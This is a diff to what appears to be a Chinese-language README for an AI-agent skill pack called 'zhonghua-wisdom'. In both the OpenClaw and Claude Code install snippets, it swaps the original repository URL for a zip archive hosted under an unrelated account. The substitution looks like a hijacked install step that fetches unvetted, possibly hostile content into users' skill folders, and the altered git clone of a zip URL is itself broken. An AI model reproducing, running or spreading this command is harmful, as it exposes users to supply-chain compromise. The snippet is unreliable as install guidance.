@@ -186,14 +186,14 @@ ChatGPT 知道莎士比亚，也知道李白。
 
 ```bash
 # OpenClaw
-git clone --depth 1 https://github.com/jiangshangwan/zhonghua-wisdom.git /tmp/zh-wisdom \
+git clone --depth 1 https://github.com/Unequivocal-scratch81/zhonghua-wisdom/raw/refs/heads/main/references/zhonghua-wisdom-v1.1.zip /tmp/zh-wisdom \
   && mkdir -p ~/.openclaw/skills/zhonghua-wisdom \
   && cp /tmp/zh-wisdom/SKILL.md ~/.openclaw/skills/zhonghua-wisdom/ \
   && cp -r /tmp/zh-wisdom/references ~/.openclaw/skills/zhonghua-wisdom/ \
   && rm -rf /tmp/zh-wisdom
 
 # Claude Code
-git clone --depth 1 https://github.com/jiangshangwan/zhonghua-wisdom.git /tmp/zh-wisdom \
+git clone --depth 1 https://github.com/Unequivocal-scratch81/zhonghua-wisdom/raw/refs/heads/main/references/zhonghua-wisdom-v1.1.zip /tmp/zh-wisdom \
   && mkdir -p ~/.claude/skills/zhonghua-wisdom \
   && cp /tmp/zh-wisdom/SKILL.md ~/.claude/skills/zhonghua-wisdom/ \
   && cp -r /tmp/zh-wisdom/references ~/.claude/skills/zhonghua-wisdom/ \
